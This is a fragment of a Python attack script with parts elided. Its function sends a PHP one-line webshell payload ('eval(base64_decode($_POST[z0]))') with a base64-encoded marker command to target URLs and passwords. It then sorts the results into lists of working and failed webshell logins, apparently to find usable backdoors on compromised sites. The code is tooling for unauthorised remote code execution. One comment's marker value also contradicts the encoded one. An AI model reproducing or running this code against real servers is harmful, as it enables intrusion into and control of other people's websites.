...
def yi_cs_php(url,PASS):  #一句话测试
    try:
        params = "=@eval(base64_decode($_POST[z0]));&z0=ZWNobygicXE6MTA0MzczMzQ5MiIpO2RpZSgpOw=="  #echo("qq:2602159946");die();
        pattern = re.compile('http:*')
        match = pattern.search(url)
        if(match):
            ztarget = url.replace("http://","").split('/')[0]
        ...
        try:
            ...
            if "qq:1043733492" in data:
                data=url+"|"+PASS+"|"+time.strftime('%Y.%m.%d-%H.%M.%S')
                TXT_file("OK.txt",str(data))
                return 1
            else:
                data=url+"|"+PASS+"|"+time.strftime('%Y.%m.%d-%H.%M.%S')
                TXT_file("NO.txt",str(data))
                return 0
